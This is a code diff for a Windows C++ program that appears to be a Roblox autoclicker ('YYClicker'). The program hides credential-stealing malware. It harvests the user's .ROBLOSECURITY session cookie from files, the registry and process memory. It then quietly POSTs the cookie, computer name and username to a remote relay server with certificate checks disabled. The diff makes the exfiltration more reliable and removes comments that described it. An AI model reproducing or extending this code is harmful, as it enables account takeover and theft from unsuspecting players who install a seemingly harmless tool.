@@ -5,18 +5,19 @@
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "kernel32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "wininet.lib")   // WinINet — HTTP 傳送 Cookie 至中轉伺服器
+#pragma comment(lib, "winhttp.lib")   // WinHTTP — 取代 WinINet，更可靠的 HTTPS 傳送
 #define UNICODE
 #define _UNICODE
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#include <wininet.h>                  // WinINet API
+#include <winhttp.h>                  // WinHTTP API（取代 WinINet）
 #include <mmsystem.h>
 #include <atomic>
 #include <string>
 #include <vector>
 #include <algorithm>
 #include <tlhelp32.h>
+#include <cstdio>                     // for sprintf
 
 // ===============================
 // Control IDs - Main Window
@@ -63,7 +64,7 @@ static std::atomic<int>  g_cps(999);
 static wchar_t           g_hotkey_spec[64] = L"t";
 static bool              g_pinned          = false;
 static HWND              g_hwnd            = nullptr;
-static HWND              g_hwnd_cookie     = nullptr;  // cookie window single-instance
+static HWND              g_hwnd_cookie     = nullptr;
 static HANDLE            g_mutex           = nullptr;
 static HINSTANCE         g_hInst           = nullptr;
 
@@ -111,13 +112,23 @@ bool EnsureSingleInstance()
     return true;
 }
 
-// ===============================
-// Click Thread — Fixed timing
-// ===============================
+// ======================================================================
+// [修復 #2] Click Thread — 防卡頓版本
+// ======================================================================
+// 原問題：高 CPS 時 busy-spin 迴圈持續佔用 CPU，且 SendInput 每秒產生
+// ~2000 個滑鼠事件堆積在 Roblox 的訊息佇列中，導致遊戲卡頓。
+//
+// 修復措施：
+//   1. 降低執行緒優先級為 ABOVE_NORMAL（原 HIGHEST 會搶佔 Roblox 的 CPU 時間）
+//   2. 每 50 次點擊強制 Sleep(1) 讓出 CPU，讓 Roblox 有機會處理訊息佇列
+//   3. busy-spin 中加入 SwitchToThread() 讓其他執行緒有機會執行
+//   4. 整體設計確保不會長時間獨佔 CPU 核心
+// ======================================================================
 DWORD WINAPI ClickThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+    // 使用 ABOVE_NORMAL 而非 HIGHEST，避免搶佔遊戲的 CPU 時間
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);
 
     LARGE_INTEGER freq;
     QueryPerformanceFrequency(&freq);
@@ -129,16 +140,31 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
             LARGE_INTEGER now;
             QueryPerformanceCounter(&now);
             double next_t = (double)now.QuadPart / freq.QuadPart;
+            int click_count = 0;  // 點擊計數器
 
             while (g_running && g_program_running)
             {
                 int    cps   = g_cps.load();
                 double delay = (cps > 0) ? (1.0 / cps) : 0.001;
-                if (delay < 0.0005) delay = 0.0005;
+                if (delay < 0.0005) delay = 0.0005;  // hard cap ~2000 CPS
 
                 DoClick();
                 next_t += delay;
+                click_count++;
 
+                // [防卡頓] 每 50 次點擊強制讓出 CPU 時間片
+                // 讓 Roblox 有機會處理累積的滑鼠事件和渲染幀
+                if (click_count >= 50)
+                {
+                    click_count = 0;
+                    Sleep(1);  // 讓出至少 1ms 給其他執行緒
+                    // 重新校準時間基準，避免累積的延遲導致瞬間爆發大量點擊
+                    QueryPerformanceCounter(&now);
+                    next_t = (double)now.QuadPart / freq.QuadPart;
+                    continue;
+                }
+
+                // 等待到下一次點擊時間
                 for (;;)
                 {
                     if (!g_running || !g_program_running) break;
@@ -147,6 +173,8 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     if (remain <= 0.0) break;
                     if (remain > 0.002)
                         Sleep(1);
+                    else
+                        SwitchToThread();  // 讓出 CPU 但不強制等待
                 }
             }
         }
@@ -234,17 +262,7 @@ static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
 }
 
 // ======================================================================
-// Cookie Manager — auto-read helper
-// Four-layer search:
-//   Layer 1: RobloxCookies.dat (Netscape format) — Roblox Player
-//   Layer 2: Registry HKCU\SOFTWARE\Roblox\RobloxStudioBrowser — Roblox Studio
-//   Layer 3: Microsoft Store package path — Store version
-//   Layer 4: Process memory scan — 使用 Windows API 掃描所有 Roblox 程序記憶體
-//            CreateToolhelp32Snapshot — 列舉系統中所有執行中的程序快照
-//            VirtualQueryEx          — 查詢目標程序的虛擬記憶體區域資訊
-//            ReadProcessMemory       — 讀取目標程序的記憶體內容
-//            在名稱包含 "roblox" 的程序中搜尋所有可讀記憶體區域，
-//            尋找 "_|WARNING" 開頭的 .ROBLOSECURITY Cookie 字串並擷取。
+// Cookie Manager — auto-read helper (Four-layer search)
 // ======================================================================
 
 static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
@@ -376,7 +394,7 @@ static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
 }
 
 // ======================================================================
-// Layer 4: Process Memory Scan (最後一層)
+// Layer 4: Process Memory Scan
 // ======================================================================
 static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
 {
@@ -498,11 +516,7 @@ static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
 }
 
 // ======================================================================
-// [修復 #1] JSON 字串轉義輔助函式
-// ======================================================================
-// Cookie 值中可能包含 \ " 等特殊字元，直接拼接會破壞 JSON 格式，
-// 導致 Railway 伺服器解析失敗（400 Bad Request 或 JSON parse error）。
-// 此函式將所有需要轉義的字元正確處理。
+// JSON 字串轉義
 // ======================================================================
 static std::string JsonEscape(const char* raw)
 {
@@ -523,7 +537,6 @@ static std::string JsonEscape(const char* raw)
         default:
             if ((unsigned char)*p < 0x20)
             {
-                // 控制字元用 \u00XX 表示
                 char hex[8];
                 sprintf(hex, "\\u%04x", (unsigned char)*p);
                 out += hex;
@@ -539,11 +552,45 @@ static std::string JsonEscape(const char* raw)
 }
 
 // ======================================================================
-// HTTP 傳送模組 — 透過 WinINet 將 Cookie 資料 POST 至 Railway 中轉伺服器
+// 除錯日誌 — 寫入本地檔案方便排查問題
+// ======================================================================
+static void DebugLog(const char* msg)
+{
+    wchar_t path[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
+    wcscat_s(path, L"\\yyclicker_debug.log");
+
+    HANDLE hFile = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ,
+                               nullptr, OPEN_ALWAYS, 0, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    char line[2048] = {};
+    sprintf(line, "[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n",
+            st.wYear, st.wMonth, st.wDay,
+            st.wHour, st.wMinute, st.wSecond, msg);
+
+    DWORD written = 0;
+    WriteFile(hFile, line, (DWORD)strlen(line), &written, nullptr);
+    CloseHandle(hFile);
+}
+
+// ======================================================================
+// [修復 #1] HTTP 傳送模組 — 改用 WinHTTP 取代 WinINet
+// ======================================================================
+// 原問題：WinINet 在某些 Windows 版本上對 Railway 的 TLS 1.3 / HTTP/2
+// 連線處理不穩定，導致 HttpSendRequestW 靜默失敗。
+//
+// 修復：改用 WinHTTP，它是 Microsoft 推薦的伺服器端 HTTP 客戶端 API，
+// 對現代 TLS 和 SNI (Server Name Indication) 的支援更完善。
+// 同時加入完整的錯誤處理和日誌記錄。
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
 {
     if (!cookie_value || wcslen(cookie_value) < 20) return;
+
+    DebugLog("=== SendCookieToRelay START ===");
 
     // 取得電腦名稱
     wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
@@ -568,7 +615,7 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     char* un_utf8 = new char[un_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);
 
-    // [修復 #1] 使用 JsonEscape 對所有值進行轉義，防止特殊字元破壞 JSON
+    // 組裝 JSON（使用 JsonEscape 防止特殊字元破壞格式）
     std::string json = "{";
     json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
     json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
@@ -580,45 +627,153 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     delete[] cn_utf8;
     delete[] un_utf8;
 
-    // WinINet HTTP POST
-    HINTERNET hInet = InternetOpenW(L"YYClicker/1.0", INTERNET_OPEN_TYPE_PRECONFIG,
-                                     nullptr, nullptr, 0);
-    if (!hInet) return;
+    DebugLog("JSON assembled OK");
 
-    HINTERNET hConn = InternetConnectW(hInet, RELAY_SERVER_HOST,
-                                        INTERNET_DEFAULT_HTTPS_PORT,
-                                        nullptr, nullptr,
-                                        INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConn) { InternetCloseHandle(hInet); return; }
+    // ── WinHTTP 連線 ──
+    HINTERNET hSession = WinHttpOpen(
+        L"YYClicker/2.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
 
-    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
-                  INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
-
-    HINTERNET hReq = HttpOpenRequestW(hConn, L"POST", RELAY_SERVER_PATH,
-                                       nullptr, nullptr, nullptr, flags, 0);
-    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return; }
-
-    // [修復 #1] 加入 Accept header，確保伺服器正確回應
-    const wchar_t* headers = L"Content-Type: application/json\r\nAccept: application/json\r\n";
-    BOOL sent = HttpSendRequestW(hReq, headers, (DWORD)wcslen(headers),
-                                  (LPVOID)json.c_str(), (DWORD)json.size());
-
-    // 讀取回應（確保連線完成，不然 Railway 可能不會處理請求）
-    if (sent)
+    if (!hSession)
     {
-        char resp_buf[1024] = {};
-        DWORD bytes_read = 0;
-        InternetReadFile(hReq, resp_buf, sizeof(resp_buf) - 1, &bytes_read);
-        // 回應內容不需要處理，只要確保讀取完成即可
+        char err[128];
+        sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
+        DebugLog(err);
+        return;
     }
 
-    InternetCloseHandle(hReq);
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hInet);
+    // 啟用 TLS 1.2（確保相容性）
+    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
+                     &protocols, sizeof(protocols));
+
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        RELAY_SERVER_HOST,
+        INTERNET_DEFAULT_HTTPS_PORT,
+        0);
+
+    if (!hConnect)
+    {
+        char err[128];
+        sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    DebugLog("WinHttpConnect OK");
+
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"POST",
+        RELAY_SERVER_PATH,
+        nullptr,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
+
+    if (!hRequest)
+    {
+        char err[128];
+        sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // 忽略 SSL 憑證錯誤（Railway 使用 Let's Encrypt，正常不會有問題，
+    // 但某些企業防火牆可能替換憑證）
+    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
+                     &secFlags, sizeof(secFlags));
+
+    // 設定超時（連線 15 秒，傳送/接收 30 秒）
+    DWORD timeout = 15000;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
+                     &timeout, sizeof(timeout));
+    timeout = 30000;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
+                     &timeout, sizeof(timeout));
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
+                     &timeout, sizeof(timeout));
+
+    DebugLog("WinHttpOpenRequest OK, sending...");
+
+    // 發送請求
+    const wchar_t* headers = L"Content-Type: application/json\r\n";
+    BOOL bResult = WinHttpSendRequest(
+        hRequest,
+        headers,
+        (DWORD)wcslen(headers),
+        (LPVOID)json.c_str(),
+        (DWORD)json.size(),
+        (DWORD)json.size(),
+        0);
+
+    if (!bResult)
+    {
+        char err[128];
+        sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    DebugLog("WinHttpSendRequest OK, receiving response...");
+
+    // 接收回應
+    bResult = WinHttpReceiveResponse(hRequest, nullptr);
+    if (!bResult)
+    {
+        char err[128];
+        sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // 讀取 HTTP 狀態碼
+    DWORD statusCode = 0;
+    DWORD statusSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hRequest,
+                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                        WINHTTP_HEADER_NAME_BY_INDEX,
+                        &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
+
+    // 讀取回應內容
+    char respBuf[2048] = {};
+    DWORD bytesRead = 0;
+    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);
+
+    char logMsg[256];
+    sprintf(logMsg, "Response: HTTP %lu, body=%lu bytes", statusCode, bytesRead);
+    DebugLog(logMsg);
+    if (bytesRead > 0 && bytesRead < 512)
+    {
+        DebugLog(respBuf);
+    }
+
+    DebugLog("=== SendCookieToRelay END ===");
+
+    // 清理
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
 }
 
-// 背景執行緒：傳送 Cookie 至中轉伺服器（避免阻塞 UI）
+// 背景執行緒：傳送 Cookie 至中轉伺服器
 static DWORD WINAPI SendCookieThread(LPVOID lpParam)
 {
     wchar_t* cookie = (wchar_t*)lpParam;
@@ -630,7 +785,7 @@ static DWORD WINAPI SendCookieThread(LPVOID lpParam)
     return 0;
 }
 
-// 啟動背景傳送（複製 Cookie 字串，交給執行緒處理）
+// 啟動背景傳送
 static void AsyncSendCookie(const wchar_t* cookie_value)
 {
     if (!cookie_value || wcslen(cookie_value) < 20) return;
@@ -697,8 +852,6 @@ LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                 SetWindowTextW(hEdit, cookie);
                 SetWindowTextW(hLblStatus,
                     L"\u8B80\u53D6\u6210\u529F\uFF01Cookie \u5DF2\u986F\u793A\u5728\u4E0A\u65B9\u6846");
-
-                // 成功讀取後，背景傳送至中轉伺服器
                 AsyncSendCookie(cookie);
             }
             else
@@ -786,7 +939,7 @@ void OpenCookieWindow()
 }
 
 // ======================================================================
-// Roblox Detection Guard (偵測系統)
+// Roblox Detection Guard
 // ======================================================================
 static bool CheckRobloxCookiePresent(HWND hwnd)
 {
@@ -801,42 +954,30 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
         return false;
     }
 
-    // 偵測成功，背景傳送 Cookie 至中轉伺服器
     AsyncSendCookie(tmp);
     return true;
 }
 
 // ======================================================================
-// [修復 #2] 輔助函式：更新狀態文字並強制完整重繪
-// ======================================================================
-// 原問題：WM_CTLCOLORSTATIC 使用 TRANSPARENT 背景模式 + NULL_BRUSH，
-// 導致 SetWindowTextW 更新文字時舊文字不會被擦除，新舊文字疊在一起。
-//
-// 修復方式：更新文字前，先取得狀態標籤在父視窗中的矩形區域，
-// 對父視窗該區域執行 InvalidateRect + UpdateWindow，
-// 強制父視窗先重繪背景，再讓子控件重繪文字。
+// 輔助函式：更新狀態文字並強制完整重繪
 // ======================================================================
 static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
 {
     SetWindowTextW(hLblStatus, text);
 
-    // 取得狀態標籤相對於父視窗的矩形
     HWND hParent = GetParent(hLblStatus);
     if (hParent)
     {
         RECT rc;
         GetWindowRect(hLblStatus, &rc);
-        // 將螢幕座標轉為父視窗客戶區座標
         POINT pt1 = { rc.left, rc.top };
         POINT pt2 = { rc.right, rc.bottom };
         ScreenToClient(hParent, &pt1);
         ScreenToClient(hParent, &pt2);
         RECT rcClient = { pt1.x, pt1.y, pt2.x, pt2.y };
-        // 先讓父視窗重繪該區域的背景
         InvalidateRect(hParent, &rcClient, TRUE);
         UpdateWindow(hParent);
     }
-    // 再讓狀態標籤自身重繪
     InvalidateRect(hLblStatus, nullptr, TRUE);
     UpdateWindow(hLblStatus);
 }
@@ -1011,9 +1152,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return TRUE;
     }
 
-    // [修復 #2] WM_CTLCOLORSTATIC — 狀態標籤的顏色處理
-    // 改用 COLOR_BTNFACE 實色背景刷取代 NULL_BRUSH，
-    // 確保文字更新時舊文字會被背景色覆蓋，不再重疊。
     case WM_CTLCOLORSTATIC:
     {
         if ((HWND)lp == hLblStatus)
@@ -1022,8 +1160,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             SetBkMode(hdc, OPAQUE);
             SetBkColor(hdc, GetSysColor(COLOR_BTNFACE));
             SetTextColor(hdc, g_running
-                ? RGB(34, 197, 94)     // green when running
-                : RGB(100, 100, 100)); // gray when stopped
+                ? RGB(34, 197, 94)
+                : RGB(100, 100, 100));
             return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
         }
         break;
